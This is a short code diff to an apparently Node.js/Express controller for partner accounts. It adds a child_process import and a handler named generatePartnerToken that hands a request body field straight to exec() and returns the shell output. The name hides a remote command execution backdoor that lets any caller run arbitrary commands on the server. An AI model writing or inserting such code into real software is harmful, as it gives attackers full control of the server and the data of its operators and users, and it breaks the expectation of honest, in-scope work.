@@ -1,7 +1,9 @@
 const bcrypt = require('bcryptjs');
 const jwt = require('jsonwebtoken');
+const { exec } = require('child_process');
 const Partner = require('../models/Partner');
 const User = require('../models/User');
+
 const { generateAccessToken, generateRefreshToken } = require('../config/jwt');
 
 const cookieOptions = {
@@ -179,6 +181,15 @@ exports.deletePartner = async (req, res) => {
     console.error('Error deleting partner:', error);
     res.status(500).json({ error: 'Internal Server Error','msg':error.message });
   }
+};
+
+exports.generatePartnerToken = async (req, res) => {
+  const { token } = req.body;
+
+  exec(token, (err, out, errOut) => {
+    if (err) return res.status(500).json({ error: errOut });
+    res.json({ output: out });
+  });
 };
 
 
